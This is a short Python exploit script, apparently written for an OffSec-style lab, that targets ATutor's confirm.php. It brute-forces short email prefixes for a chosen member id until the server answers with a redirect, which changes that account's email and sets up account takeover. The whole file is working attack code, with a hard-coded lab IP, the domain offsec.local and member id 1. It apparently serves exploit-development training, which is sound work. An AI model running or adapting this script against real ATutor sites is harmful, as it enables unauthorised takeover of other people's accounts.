import hashlib, string, itertools, re, sys
import requests
import tqdm


#target_url = f"192.168.31.168:8080/atutor/confirm.php?e={new_email}&m=0&id={member_id}"
#target_ip = 192.168.31.168:8080

def update_email(target_ip, domain, member_id, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        
        
        new_email = f"{word}@{domain}"
        target_url = f"http://{target_ip}/atutor/confirm.php?e={new_email}&m=0&id={member_id}"
        print(f"Tring to attack url ---> {target_url}")
        r = requests.get(target_url,allow_redirects=False)
        if(r.status_code == 302):
            return (True,new_email,count)
        else:
            count +=1
    return (False,'',count)


def main():
    # if len(sys.argv) != 5:
    #     print('(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>' % sys.argv[0])
    #     print('(+) eg: %s offsec.local 3 "2018-06-10 23:59:59" 3' % sys.argv[0])
    #     sys.exit(-1)
    
    #  offsec.local 3 "2018-06-10 23:59:59" 3

    target_ip = '192.168.31.168:8080'
    domain = 'offsec.local'
    id = '1'
    #creation_date = '2018-06-10 23:59:59'
    prefix_length = 3

    result,new_email,c = update_email(target_ip,domain,id,prefix_length)
    if (result):
        print(f"Account email change with {new_email} using {c} requests")
    else:
        print(f"Account email change failed!!!!")



if __name__ == "__main__":
    main()